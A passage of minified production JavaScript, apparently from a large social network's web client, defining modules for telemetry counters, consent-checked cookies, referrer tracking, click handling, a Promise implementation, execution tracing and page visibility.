      logAsync: function (c, d) {
        D(a, b, d, c, o)["catch"](E);
      },
      logImmediately: function (c, d) {
        C(a, b, d, c, p);
      },
      logCritical: function (c, d) {
        C(a, b, d, c, q);
      },
      logRealtimeEvent: function (c, d) {
        C(a, b, d, c, q);
      }
    };
  }
  g.observable = r;
  g.cmcdObservable = s;
  g.create = f;
}, 98);
__d("ODS", ["ExecutionEnvironment", "OdsWebBatchFalcoEvent", "Random", "Run", "clearTimeout", "gkx", "setTimeout", "unrecoverableViolation"], function (a, b, c, d, e, f, g) {
  var h,
    i = c("ExecutionEnvironment").canUseDOM || c("ExecutionEnvironment").isInWorker,
    j = {};
  function k(a, b, c, d, e) {
    var f;
    d === void 0 && (d = 1);
    e === void 0 && (e = 1);
    var g = (f = j[b]) != null ? f : null;
    if (g != null && g <= 0) return;
    h = h || {};
    var i = h[a] || (h[a] = {}),
      k = i[b] || (i[b] = {}),
      l = k[c] || (k[c] = [0, null]),
      n = Number(d),
      o = Number(e);
    g > 0 && (n /= g, o /= g);
    if (!isFinite(n) || !isFinite(o)) return;
    l[0] += n;
    if (arguments.length >= 5) {
      var p = l[1];
      p == null && (p = 0);
      l[1] = p + o;
    }
    m();
  }
  var l;
  function m() {
    if (l != null) return;
    l = c("setTimeout")(function () {
      n();
    }, c("gkx")("708253") ? 13e3 / 2 : 5e3);
  }
  function a(a, b) {
    if (!i) return;
    j[a] = d("Random").random() < b ? b : 0;
  }
  function b(a, b, c, d) {
    d === void 0 && (d = 1);
    if (!i) return;
    k(a, b, c, d);
  }
  function e(a, b, c, d, e) {
    d === void 0 && (d = 1);
    e === void 0 && (e = 1);
    if (!i) return;
    k(a, b, c, d, e);
  }
  function n(a) {
    a === void 0 && (a = "normal");
    if (!i) return;
    c("clearTimeout")(l);
    l = null;
    if (h == null) return;
    var b = h;
    h = null;
    function d() {
      return {
        batch: b
      };
    }
    a === "critical" ? c("OdsWebBatchFalcoEvent").logCritical(d) : c("OdsWebBatchFalcoEvent").log(d);
  }
  i && d("Run").onUnload(function () {
    n("critical");
  });
  g.setEntitySample = a;
  g.bumpEntityKey = b;
  g.bumpFraction = e;
  g.flush = n;
}, 98);
__d("Cookie", ["CookieConsent", "CookieCore", "InitialCookieConsent", "ODS"], function (a, b, c, d, e, f, g) {
  function h(a) {
    if (!c("CookieConsent").hasConsent(1)) {
      d("ODS").bumpEntityKey(798, "defer_cookies", "set." + a);
      return !1;
    }
    return !0;
  }
  function i() {
    return !c("InitialCookieConsent").noCookies;
  }
  function a(a, b) {
    if (!i() || !h(a)) return;
    d("CookieCore").set(a, b);
  }
  function b(a, b) {
    if (!i()) return;
    d("CookieCore").set(a, b);
  }
  function e(a, b, c, e, f, g) {
    if (!i() || !h(a)) return;
    d("CookieCore").setWithoutChecks(a, b, c, e, f, null, g);
  }
  f = {
    clear: d("CookieCore").clear,
    get: d("CookieCore").get,
    set: a,
    setIfFirstPartyContext: d("CookieCore").setIfFirstPartyContext,
    setWithoutCheckingUserConsent_DANGEROUS: b,
    setWithoutChecks: e,
    setWithoutChecksIfFirstPartyContext: d("CookieCore").setWithoutChecksIfFirstPartyContext
  };
  g["default"] = f;
}, 98);
__d("trackReferrer", ["Cookie", "Parent"], function (a, b, c, d, e, f) {
  var g = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/;
  function h(a) {
    return ((a = g.exec(a)) == null ? void 0 : a[1]) || "";
  }
  function a(a, c) {
    a = b("Parent").byAttribute(a, "data-referrer");
    if (a) {
      c = h(c);
      if (!c) return;
      a = c + "|" + ((c = a.getAttribute("data-referrer")) != null ? c : "");
      b("Cookie").set("x-src", a);
    }
  }
  e.exports = a;
}, null);
__d("Primer", ["invariant", "Bootloader", "CSS", "Env", "Event", "Parent", "PhotoSnowliftLoader", "PrimerInlineHandlers", "ReactServerPrimer", "TimeSlice", "clickRefAction", "firstClickTimestamp", "ifRequired", "performanceNow", "requireDeferred", "trackReferrer"], function (a, b, c, d, e, f, g, h) {
  var i = c("requireDeferred")("AsyncRequest").__setRef("Primer"),
    j = null,
    k = /async(?:-post)?|dialog(?:-post)?|theater|toggle/;
  a = document.documentElement;
  a != null || h(0, 2301);
  function l(a, b, e, f, g) {
    d("firstClickTimestamp").setIfFirstClick(b, c("performanceNow")());
    var j = b.getAttribute("ajaxify"),
      l = b.href,
      m = f != null && f !== "" ? f : j || l;
    m && c("clickRefAction")("a", b, a).coalesce_namespace("primer");
    if (j && l && !/#$/.test(l)) {
      f = a.which && a.which === 2;
      j = a.altKey || a.ctrlKey || a.metaKey || a.shiftKey;
      if (f || j) return;
    }
    l = d("PrimerInlineHandlers").run(e, a, "data-onclick");
    c("trackReferrer")(b, m);
    var n = g || b.rel;
    n = n && n.match(k);
    n = n && n[0];
    f = "Primer: " + n;
    switch (n) {
      case "dialog":
      case "dialog-post":
        c("Bootloader").loadModules(["AsyncDialog"], function (a) {
          a.bootstrap(m, b, n);
        }, f);
        break;
      case "async":
      case "async-post":
        i.loadImmediately(function (a) {
          a.bootstrap(m, b, n === "async-post");
        });
        break;
      case "theater":
        !c("Env").isCQuick ? d("PhotoSnowliftLoader").load(m, b, f) : c("ifRequired")("PageTransitions", function (a) {
          a.go(m);
        });
        break;
      case "toggle":
        j = b.parentNode;
        j != null || h(0, 2302);
        d("CSS").toggleClass(j, "openToggler");
        c("Bootloader").loadModules(["Toggler"], function (a) {
          if (b.parentNode == null) return;
          a.bootstrap(b);
        }, f);
        break;
      default:
        c("ifRequired")("PageTransitionsRegistrar", function (b) {
          b.__onClick(a);
        }, function () {});
        return l;
    }
    return !1;
  }
  c("Event").listen(document, "click", function (a) {
    a = a || window.event;
    if (a.button >= 2) return;
    j = a.target || a.srcElement;
    var b = d("Parent").byTag(j, "A");
    b instanceof HTMLAnchorElement ? b = l(a, b, j) : b = d("PrimerInlineHandlers").run(j, a, "data-onclick");
    b == null && (b = d("ReactServerPrimer").handleEvent("data-sr-onclick", a, j));
    return b;
  }, c("Event").Priority._BUBBLE);
  c("Event").listen(document, "submit", function (a) {
    var b = a.getTarget(),
      d = b && b.getAttribute("rel");
    if (b && b.nodeName == "FORM" && (d == "async" || d === "dialog")) {
      c("clickRefAction")("f", b, a).coalesce_namespace("primer");
      var e = j;
      switch (d) {
        case "async":
          c("Bootloader").loadModules(["FormSubmit"], function (a) {
            a.send(b, e);
          }, "Primer: async");
          break;
        case "dialog":
          c("Bootloader").loadModules(["FormSubmit", "AsyncDialog"], function (a, c) {
            a = a.buildRequest(b, e);
            a && c.send(a);
          }, "Primer: form dialog");
          break;
      }
      return !1;
    } else return c("ifRequired")("PageTransitionsRegistrar", function (b) {
      return b.__onSubmit(a, j);
    });
  }, c("Event").Priority._BUBBLE);
  var m = null;
  b = function (a, b) {
    b = b || window.event;
    m = b.target || b.srcElement;
    var c = d("PrimerInlineHandlers").run(m, b, "data-on" + a);
    n();
    a === "mouseover" && (o(), c == null && m && (c = d("ReactServerPrimer").handleEvent("data-sr-onmouseover", b, m)));
  };
  e = function (a, b) {
    b = b || window.event, m = b.relatedTarget || b.toElement;
  };
  var n = function () {
      var a = m,
        b = d("Parent").byAttribute(m, "data-hover");
      if (b) {
        switch (b.getAttribute("data-hover")) {
          case "tooltip":
            c("Bootloader").loadModules(["Tooltip"], function (c) {
              m === a && c.process(b, m);
            }, "Primer: tooltip");
            break;
        }
        return;
      }
    },
    o = function () {
      var a = m,
        b = d("Parent").byAttribute(a, "data-hovercard");
      b && c("Bootloader").loadModules(["Hovercard"], function (c) {
        m === a && c.processNode(b);
      }, "Primer: hovercard");
    };
  a.onmouseover = c("TimeSlice").guard(b.bind(null, "mouseover"), "Primer mouseover");
  a.onmouseout = c("TimeSlice").guard(e.bind(null, "mouseout"), "Primer mouseout");
  f = c("TimeSlice").guard(b.bind(null, "focus"), "Primer focus");
  a.addEventListener ? a.addEventListener("focus", f, !0) : a.attachEvent("onfocusin", f);
  e = c("TimeSlice").guard(b.bind(null, "keypress"), "Primer keypress");
  a.addEventListener && a.addEventListener("keypress", e, !0);
  d("PhotoSnowliftLoader").preload();
  g.primerHandleAjaxify = l;
}, 98);
__d("PromiseImpl", ["ErrorPubSub", "TimeSlice", "err", "setImmediateAcrossTransitions", "setTimeoutAcrossTransitions"], function (a, b, c, d, e, f) {
  "use strict";

  var g;
  function h() {}
  var i = null,
    j = {};
  function k(a) {
    try {
      return a.then;
    } catch (a) {
      i = a;
      return j;
    }
  }
  function l(a, b) {
    try {
      return a(b);
    } catch (a) {
      i = a;
      return j;
    }
  }
  function m(a, b, c) {
    try {
      a(b, c);
    } catch (a) {
      i = a;
      return j;
    }
  }
  function n(a) {
    if (typeof this !== "object") throw new TypeError("Promises must be constructed via new");
    if (typeof a !== "function") throw new TypeError("not a function");
    this._state = 0;
    this._value = null;
    this._deferreds = [];
    if (a === h) return;
    u(a, this);
  }
  n._noop = h;
  n.prototype.then = function (a, b) {
    if (this.constructor !== n) return o(this, a, b);
    var c = new n(h);
    p(this, new t(a, b, c));
    return c;
  };
  function o(a, b, c) {
    return new a.constructor(function (d, e) {
      var f = new n(h);
      f.then(d, e);
      p(a, new t(b, c, f));
    });
  }
  function p(a, c) {
    while (a._state === 3) a = a._value;
    if (a._state === 0) {
      a._deferreds.push(c);
      return;
    }
    b("setImmediateAcrossTransitions")(function () {
      var b = a._state === 1 ? c.onFulfilled : c.onRejected;
      if (b === null) {
        c.continuation(function () {});
        a._state === 1 ? q(c.promise, a._value) : r(c.promise, a._value);
        return;
      }
      b = l(c.continuation.bind(null, b), a._value);
      b === j ? r(c.promise, i) : q(c.promise, b);
    });
  }
  function q(a, b) {
    if (b === a) return r(a, new TypeError("A promise cannot be resolved with itself."));
    if (b && (typeof b === "object" || typeof b === "function")) {
      var c = k(b);
      if (c === j) return r(a, i);
      if (c === a.then && b instanceof n) {
        a._state = 3;
        a._value = b;
        s(a);
        return;
      } else if (typeof c === "function") {
        u(c.bind(b), a);
        return;
      }
    }
    a._state = 1;
    a._value = b;
    s(a);
  }
  function r(a, b) {
    a._state = 2, a._value = b, s(a);
  }
  function s(a) {
    for (var b = 0; b < a._deferreds.length; b++) p(a, a._deferreds[b]);
    a._deferreds = null;
  }
  function t(a, c, d) {
    this.onFulfilled = typeof a === "function" ? a : null, this.onRejected = typeof c === "function" ? c : null, this.continuation = b("TimeSlice").getGuardedContinuation("Promise Handler"), this.promise = d;
  }
  function u(a, b) {
    var c = !1;
    a = m(a, function (a) {
      if (c) return;
      c = !0;
      q(b, a);
    }, function (a) {
      if (c) return;
      c = !0;
      r(b, a);
    });
    !c && a === j && (c = !0, r(b, i));
  }
  var v = B(!0),
    w = B(!1),
    x = B(null),
    y = B(void 0),
    z = B(0),
    A = B("");
  function B(a) {
    var b = new n(n._noop);
    b._state = 1;
    b._value = a;
    return b;
  }
  n.resolve = function (a) {
    if (a instanceof n) return a;
    if (a === null) return x;
    if (a === void 0) return y;
    if (a === !0) return v;
    if (a === !1) return w;
    if (a === 0) return z;
    if (a === "") return A;
    if (typeof a === "object" || typeof a === "function") try {
      var b = a.then;
      if (typeof b === "function") return new n(b.bind(a));
    } catch (a) {
      return new n(function (b, c) {
        c(a);
      });
    }
    return B(a);
  };
  n.all = function (a) {
    Array.isArray(a) || (a = [n.reject(new TypeError("Promise.all must be passed an array."))]);
    var b = Array.prototype.slice.call(a);
    return new n(function (a, c) {
      if (b.length === 0) return a([]);
      var d = b.length;
      function e(f, g) {
        if (g && (typeof g === "object" || typeof g === "function")) if (g instanceof n && g.then === n.prototype.then) {
          while (g._state === 3) g = g._value;
          if (g._state === 1) return e(f, g._value);
          g._state === 2 && c(g._value);
          g.then(function (a) {
            e(f, a);
          }, c);
          return;
        } else {
          var h = g.then;
          if (typeof h === "function") {
            h = new n(h.bind(g));
            h.then(function (a) {
              e(f, a);
            }, c);
            return;
          }
        }
        b[f] = g;
        --d === 0 && a(b);
      }
      for (var f = 0; f < b.length; f++) e(f, b[f]);
    });
  };
  n.reject = function (a) {
    return new n(function (b, c) {
      c(a);
    });
  };
  n.race = function (a) {
    return new n(function (b, c) {
      a.forEach(function (a) {
        n.resolve(a).then(b, c);
      });
    });
  };
  n.prototype["catch"] = function (a) {
    return this.then(null, a);
  };
  n.prototype.done = function (a, c) {
    (g || (g = b("ErrorPubSub"))).reportError(b("err")("Promise.done is deprecated. Please use promiseDone."));
    var d = new Error("Promise.done"),
      e = arguments.length ? this.then.apply(this, arguments) : this;
    e.then(null, function (a) {
      b("setTimeoutAcrossTransitions")(function () {
        if (a instanceof Error) throw a;else {
          d.message = "" + a;
          throw d;
        }
      }, 0);
    });
  };
  e.exports = n;
}, null);
__d("ChatConfig", ["invariant", "ChatConfigInitialData"], function (a, b, c, d, e, f, g, h) {
  var i = babelHelpers["extends"]({}, c("ChatConfigInitialData"));
  function j(a, b) {
    return a in i ? i[a] : b;
  }
  function a(a) {
    return !!j(a, !1);
  }
  function b(a, b) {
    b === void 0 && (b = 0);
    if (a in i) {
      typeof i[a] === "number" || h(0, 3109);
      return i[a];
    }
    return b;
  }
  function d(a, b) {
    i[a] = b;
  }
  function e() {
    return i;
  }
  g.get = j;
  g.getBool = a;
  g.getNumber = b;
  g.set = d;
  g.getDebugInfo = e;
}, 98);
__d("SidebarPrelude", ["Arbiter", "Bootloader", "CSS", "ChatConfig", "URI", "setTimeout"], function (a, b, c, d, e, f, g) {
  var h = d("ChatConfig").get("sidebar.hide_buddylist_off_homepage"),
    i = d("ChatConfig").get("sidebar.hide_buddylist_off_allpage"),
    j = "buddylistOff",
    k = "sidebarMode";
  function a(a) {
    var b = document.documentElement;
    if (b) {
      var e = i || h && !l();
      e ? d("CSS").addClass(b, j) : (d("CSS").removeClass(b, j), h && c("setTimeout")(function () {
        c("Bootloader").loadModules(["Dock"], function (a) {
          a.resizeAllFlyouts();
        }, "SidebarPrelude");
      }));
      b.clientWidth > a && (d("CSS").addClass(b, k), c("Arbiter").inform("sidebar/visibility", !0, "state"));
    }
  }
  function b() {
    var a = document.documentElement;
    if (a) {
      var b = i || h && !l();
      b ? d("CSS").addClass(a, j) : (d("CSS").removeClass(a, j), h && c("setTimeout")(function () {
        c("Bootloader").loadModules(["Dock"], function (a) {
          a.resizeAllFlyouts();
        }, "SidebarPrelude");
      }));
    }
  }
  function l() {
    return new (c("URI"))(window.location.href).getPath() === "/";
  }
  g.addSidebarMode = a;
  g.addBuddylistMode = b;
  g.isOnHomepage = l;
}, 98);
__d("SubmitOnEnterListener", ["Bootloader", "CSS"], function (a, b, c, d, e, f) {
  document.documentElement.onkeydown = function (a) {
    a = a || window.event;
    var c = a.target || a.srcElement;
    a = a.keyCode == 13 && !a.altKey && !a.ctrlKey && !a.metaKey && !a.shiftKey && b("CSS").hasClass(c, "enter_submit");
    if (a) {
      b("Bootloader").loadModules(["DOM", "Input", "trackReferrer", "Form"], function (a, b, d, e) {
        if (!b.isEmpty(c)) {
          b = c.form;
          a = a.scry(b, ".enter_submit_target")[0] || a.scry(b, '[type="submit"]')[0];
          if (a) {
            e = e.getAttribute(b, "ajaxify") || e.getAttribute(b, "action");
            e && d(b, e);
            a.click();
          }
        }
      }, "SubmitOnEnterListener");
      return !1;
    }
  };
}, null);
__d("IntervalTrackingBoundedBuffer", ["CircularBuffer", "ErrorPubSub"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = 5e3;
  a = function () {
    function a(a) {
      var b = this;
      this.$6 = 0;
      if (a != null) {
        if (a <= 0) throw new Error("Size for a buffer must be greater than zero.");
      } else a = h;
      this.$4 = a;
      this.$1 = new (c("CircularBuffer"))(a);
      this.$1.onEvict(function () {
        b.$6++;
      });
      this.$2 = [];
      this.$3 = 1;
      this.$5 = 0;
    }
    var b = a.prototype;
    b.open = function () {
      var a = this,
        b = this.$3++,
        c = !1,
        d,
        e = this.$5,
        f = {
          id: b,
          startIdx: e,
          hasOverflown: function () {
            return f.getOverflowSize() > 0;
          },
          getOverflowSize: function () {
            return d != null ? d : Math.max(a.$6 - e, 0);
          },
          close: function () {
            if (c) return [];else {
              c = !0;
              d = a.$6 - e;
              return a.$7(b);
            }
          }
        };
      this.$2.push(f);
      return f;
    };
    b.pushElement = function (a) {
      this.$2.length > 0 && (this.$1.write(a), this.$5++);
      return this;
    };
    b.isActive = function () {
      return this.$2.length > 0;
    };
    b.$8 = function (a) {
      return Math.max(a - this.$6, 0);
    };
    b.$7 = function (a) {
      var b, d, e, f;
      for (var g = 0; g < this.$2.length; g++) {
        var h = this.$2[g],
          i = h.startIdx;
        h = h.id;
        h === a ? (e = g, f = i) : (d == null || i < d) && (d = i);
        (b == null || i < b) && (b = i);
      }
      if (e == null || b == null || f == null) {
        c("ErrorPubSub").reportError(new Error("messed up state inside IntervalTrackingBoundedBuffer"));
        return [];
      }
      this.$2.splice(e, 1);
      h = this.$8(f);
      i = this.$1.read().slice(h);
      g = this.$8(d == null ? this.$5 : d) - this.$8(b);
      g > 0 && (this.$1.dropFirst(g), this.$6 += g);
      return i;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("WorkerUtils", [], function (a, b, c, d, e, f) {
  "use strict";

  function b() {
    try {
      return "WorkerGlobalScope" in a && a instanceof a.WorkerGlobalScope;
    } catch (a) {
      return !1;
    }
  }
  function c() {
    try {
      return "SharedWorkerGlobalScope" in a && a instanceof a.SharedWorkerGlobalScope;
    } catch (a) {
      return !1;
    }
  }
  function d() {
    return "SharedWorker" in a && typeof a.SharedWorker === "function";
  }
  f.isWorkerContext = b;
  f.isSharedWorkerContext = c;
  f.isSharedWorkerSupported = d;
}, 66);
__d("getReusableTimeSliceContinuation", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b, c) {
    var d = !1,
      e = a.getGuardedContinuation(c),
      f = function (b) {
        e(function () {
          d || (e = a.getGuardedContinuation(c)), b();
        });
      };
    f.last = function (a) {
      var b = e;
      g();
      b(a);
    };
    f[b] = {};
    function g() {
      d = !0, e = function (a) {
        a();
      };
    }
    return f;
  }
  f["default"] = a;
}, 66);
__d("TimeSliceImpl", ["invariant", "Env", "ErrorGuard", "FBLogger", "IntervalTrackingBoundedBuffer", "WorkerUtils", "getReusableTimeSliceContinuation", "performanceAbsoluteNow", "wrapFunction"], function (a, b, c, d, e, f, g) {
  var h,
    i,
    j,
    k,
    l = [],
    m = [],
    n = "key" + Math.random(),
    o = 1,
    p = !1;
  c = (h || (h = b("Env"))).timesliceBufferSize;
  c == null && (c = 5e3);
  var q = new (b("IntervalTrackingBoundedBuffer"))(c),
    r = [],
    s = [],
    t = [];
  function u() {
    return v(r);
  }
  function v(a) {
    return a.length > 0 ? a[a.length - 1] : null;
  }
  function w(a, c) {
    var d = {};
    (i || (i = b("ErrorGuard"))).applyWithGuard(z, null, [a, c, d]);
    i.applyWithGuard(A, null, [a, c, d]);
    r.push(a);
    s.push(c);
    t.push(d);
  }
  function x(a, b, c) {
    l.forEach(function (d) {
      var e = d.onNewContextCreated(u(), b, c);
      a[d.getBeforeID()] = e;
    });
  }
  function y(a, b, c) {
    m.forEach(function (d) {
      d.onAfterContextEnded(a, b[d.getBeforeID()], c[d.getBeforeID()], a.meta);
    });
  }
  function z(a, b, c) {
    l.forEach(function (d) {
      var e = d.onBeforeContextStarted(a, b[d.getBeforeID()], a.meta);
      c[d.getBeforeID()] = e;
    });
  }
  function A(a, b, c) {
    l.forEach(function (d) {
      var e = d.onAfterContextStarted(a, b[d.getBeforeID()], c[d.getBeforeID()], a.meta);
      c[d.getBeforeID()] = e;
    });
  }
  function B() {
    var a = u(),
      c = v(s),
      d = v(t);
    if (a == null || c == null || d == null) {
      b("FBLogger")("TimeSlice").mustfix("popped too many times off the timeslice stack");
      p = !1;
      return;
    }
    (i || (i = b("ErrorGuard"))).applyWithGuard(y, null, [a, c, d]);
    p = !a.isRoot;
    r.pop();
    s.pop();
    t.pop();
  }
  var C = {
    PropagationType: {
      CONTINUATION: 0,
      EXECUTION: 1,
      ORPHAN: 2
    },
    guard: function (a, c, d) {
      typeof a === "function" || g(0, 3725);
      typeof c === "string" || g(0, 3726);
      var e = D(d);
      if (a[n]) return a;
      var f;
      p && (f = u());
      var h = {},
        l = 0;
      d = function () {
        var d = (j || (j = b("performanceAbsoluteNow")))(),
          g = o++,
          m = {
            contextID: g,
            name: c,
            isRoot: !p,
            executionNumber: l++,
            meta: e,
            absBeginTimeMs: d
          };
        w(m, h);
        if (f != null) {
          var n = !!e.isContinuation;
          f.isRoot ? (m.indirectParentID = f.contextID, m.isEdgeContinuation = n) : (m.indirectParentID = f.indirectParentID, m.isEdgeContinuation = !!(n && f.isEdgeContinuation));
        }
        var r = (k || (k = b("WorkerUtils"))).isWorkerContext();
        p = !0;
        try {
          for (var s = arguments.length, t = new Array(s), v = 0; v < s; v++) t[v] = arguments[v];
          if (!m.isRoot || r) return a.apply(this, t);else return (i || (i = b("ErrorGuard"))).applyWithGuard(a, this, t, {
            name: "TimeSlice" + (c ? ": " + c : "")
          });
        } finally {
          var x = u();
          if (x == null) b("FBLogger")("TimeSlice").mustfix("timeslice stack misaligned, not logging the block"), p = !1;else {
            var y = x.isRoot,
              z = x.contextID,
              A = x.indirectParentID,
              C = x.isEdgeContinuation,
              D = (j || (j = b("performanceAbsoluteNow")))();
            x.absEndTimeMs = D;
            if (y && d != null) {
              var E = {
                begin: d,
                end: D,
                id: z,
                indirectParentID: A,
                representsExecution: !0,
                isEdgeContinuation: f && C,
                guard: c
              };
              if (a.__SMmeta != null) {
                var F = a.__SMmeta.name,
                  G = a.__SMmeta.module;
                F != null && (E.name = F);
                G != null && (E.module = G);
              }
              q.pushElement(E);
            }
            B();
          }
        }
      };
      d[n] = {};
      (i || (i = b("ErrorGuard"))).applyWithGuard(x, null, [h, c, e]);
      return d;
    },
    copyGuardForWrapper: function (a, b) {
      a && a[n] && (b[n] = a[n]);
      return b;
    },
    getContext: function () {
      return u();
    },
    getGuardedContinuation: function (a) {
      function b(a) {
        for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
        return a.apply(this, c);
      }
      return C.guard(b, a, {
        propagationType: C.PropagationType.CONTINUATION
      });
    },
    getReusableContinuation: function (a) {
      return b("getReusableTimeSliceContinuation")(C, n, a);
    },
    getPlaceholderReusableContinuation: function () {
      var a = function (a) {
        return a();
      };
      a.last = a;
      return a;
    },
    getGuardNameStack: function () {
      return r.map(function (a) {
        return a.name;
      });
    },
    registerExecutionContextObserver: function (a) {
      var b = !1;
      for (var c = 0; c < l.length; c++) if (l[c].getBeforeID() > a.getBeforeID()) {
        l.splice(c, 0, a);
        b = !0;
        break;
      }
      b || l.push(a);
      for (c = 0; c < m.length; c++) if (m[c].getAfterID() > a.getAfterID()) {
        m.splice(c, 0, a);
        return;
      }
      m.push(a);
    },
    catchUpOnDemandExecutionContextObservers: function (a) {
      for (var b = 0; b < r.length; b++) {
        var c = r[b],
          d = s[b],
          e = t[b] || {};
        d = a.onBeforeContextStartedWhileEnabled(c, d[a.getBeforeID()], c.meta);
        e[a.getBeforeID()] = d;
        t[b] = e;
      }
    },
    getBuffer: function () {
      return q;
    }
  };
  function D(a) {
    var b = {};
    a && a.propagateCounterAttribution !== void 0 && (b.propagateCounterAttribution = a.propagateCounterAttribution);
    a && a.root !== void 0 && (b.root = a.root);
    switch (a && a.propagationType) {
      case C.PropagationType.CONTINUATION:
        b.isContinuation = !0;
        b.extendsExecution = !0;
        break;
      case C.PropagationType.ORPHAN:
        b.isContinuation = !1;
        b.extendsExecution = !1;
        break;
      case C.PropagationType.EXECUTION:
      default:
        b.isContinuation = !1, b.extendsExecution = !0;
    }
    return b;
  }
  b("wrapFunction").setWrapper(function (a, b) {
    return C.guard(a, b, {
      registerCallStack: !0
    });
  }, "entry");
  a.TimeSlice = C;
  e.exports = C;
}, 6);
__d("TimeSliceSham", ["Env", "ErrorGuard", "IntervalTrackingBoundedBuffer"], function (a, b, c, d, e, f) {
  var g, h;
  c = (g || b("Env")).timesliceBufferSize;
  c == null && (c = 5e3);
  var i = new (b("IntervalTrackingBoundedBuffer"))(c),
    j = {
      PropagationType: {
        CONTINUATION: 0,
        EXECUTION: 1,
        ORPHAN: 2
      },
      guard: function (a, c) {
        return (h || (h = b("ErrorGuard"))).guard(a, {
          name: "TimeSlice" + (c ? ": " + c : "")
        });
      },
      copyGuardForWrapper: function (a, b) {
        return a;
      },
      checkCoverage: function () {},
      setLogging: function (a, b) {},
      getContext: function () {
        return null;
      },
      getGuardedContinuation: function (a) {
        function a(a) {
          for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
          return a.apply(this, c);
        }
        return a;
      },
      getReusableContinuation: function (a) {
        return j.getPlaceholderReusableContinuation();
      },
      getPlaceholderReusableContinuation: function () {
        var a = function (a) {
          return a();
        };
        a.last = a;
        return a;
      },
      getGuardNameStack: function () {
        return [];
      },
      registerExecutionContextObserver: function (a) {},
      catchUpOnDemandExecutionContextObservers: function (a) {},
      getBuffer: function () {
        return i;
      }
    };
  a.TimeSlice = j;
  e.exports = j;
}, 6);
__d("TrustedTypesSecurityInfraLoggingDefaultPolicy_FOR_ROLLOUT_ONLY_DO_NOT_USE", ["TrustedTypesUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    name: "security_infra_logging_FOR_ROLLOUT_ONLY_DO_NOT_USE",
    policy: {
      createScriptURL: function (a, b) {
        return d("TrustedTypesUtils").noopAndLog(a);
      },
      createHTML: function (a, b) {
        return d("TrustedTypesUtils").noopAndLog(a);
      },
      createScript: function (a, b) {
        return d("TrustedTypesUtils").noopAndLog(a);
      }
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("TrustedTypesDefaultPolicy", ["Env", "TrustedTypes", "TrustedTypesSecurityInfraLoggingDefaultPolicy_FOR_ROLLOUT_ONLY_DO_NOT_USE", "TrustedTypesUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  c("Env").defaultTrustedTypesPolicyName === "security_infra_logging_FOR_ROLLOUT_ONLY_DO_NOT_USE" && (d("TrustedTypesUtils").logInfo("A default Trusted Types policy for rollout is in use. To view violations see project `saf_web_trusted_types_rollout` in LogView."), c("TrustedTypes").createDefaultPolicy(c("TrustedTypesSecurityInfraLoggingDefaultPolicy_FOR_ROLLOUT_ONLY_DO_NOT_USE")));
}, 35);
__d("URLFragmentPrelude", ["URLFragmentPreludeConfig", "requireWeak"], function (a, b, c, d, e, f) {
  a = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/;
  var g = /^[^\/\\#!\.\?\*\&\^=]+$/;
  window.location.href.replace(a, function (a, c, d, e) {
    var f;
    f = a = c + (d ? "?" + d : "");
    if (e) {
      var h = e.replace(/^(!|%21)/, "");
      h = h.charAt(0);
      if (h !== "/" && h !== "\\" && b("URLFragmentPreludeConfig").hashtagRedirect) {
        h = e.match(g);
        h && !d && c == "/" && (f = "/hashtag/" + e);
      }
    }
    f != a && (b("requireWeak")("ODS", function (a) {
      a.bumpEntityKey(3216, "url_fragment_prelude", "blue_redirected");
    }), window.location.replace(f));
  });
}, null);
__d("Visibility", ["BaseEventEmitter", "ExecutionEnvironment", "TimeSlice"], function (a, b, c, d, e, f, g) {
  var h, i;
  c("ExecutionEnvironment").canUseDOM && (document.hidden !== void 0 ? (h = "hidden", i = "visibilitychange") : document.mozHidden !== void 0 ? (h = "mozHidden", i = "mozvisibilitychange") : document.msHidden !== void 0 ? (h = "msHidden", i = "msvisibilitychange") : document.webkitHidden !== void 0 && (h = "webkitHidden", i = "webkitvisibilitychange"));
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b() {
      var b, c;
      for (var d = arguments.length, e = new Array(d), f = 0; f < d; f++) e[f] = arguments[f];
      return (b = c = a.call.apply(a, [this].concat(e)) || this, c.HIDDEN = "hidden", c.VISIBLE = "visible", c.hiddenKey = h, c.hiddenEvent = i, b) || babelHelpers.assertThisInitialized(c);
    }
    var d = b.prototype;
    d.isHidden = function () {
      return h ? document[h] : !1;
    };
    d.isSupported = function () {
      return c("ExecutionEnvironment").canUseDOM && document.addEventListener && i !== void 0;
    };
    return b;
  }(c("BaseEventEmitter"));
  var j = new a();
  j.isSupported() && document.addEventListener(j.hiddenEvent, c("TimeSlice").guard(function (a) {
    j.emit(j.isHidden() ? j.HIDDEN : j.VISIBLE, {
      changeTime: a.timeStamp
    });
  }, "visibility change"));
  b = j;
  g["default"] = b;
}, 98);
__d("VisibilityListener", ["Visibility", "performanceNow"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = Date.now() - c("performanceNow")(),
    i = [],
    j = !1,
    k = 1e4;
  i.push({
    key: h,
    value: c("Visibility").isHidden()
  });
  function l(a, b) {
    if (j || i.length > k) {
      j = !0;
      return;
    }
    i.push({
      key: a + h,
      value: b
    });
  }
  c("Visibility").addListener(c("Visibility").VISIBLE, function (a) {
    l(a.changeTime, !1);
  });
  c("Visibility").addListener(c("Visibility").HIDDEN, function (a) {
    l(a.changeTime, !0);
  });
  function m(a, b) {
    if (j) return null;
    var d;
    for (a = i.length - 1; a >= 0; a--) if (i[a].key <= b) {
      d = i.slice(0, a + 1);
      break;
    }
    if (d === void 0) return null;
    d[d.length - 1].value !== c("Visibility").isHidden() && (d[d.length] = {
      key: b,
      value: c("Visibility").isHidden()
    });
    return d;
  }
  function a(a, b) {
    var d = m(a, b);
    if (!d) return null;
    if (d.length < 2) return c("Visibility").isHidden() ? b - a : 0;
    var e = d.length - 1;
    b = d[e].value ? b - d[e].key : 0;
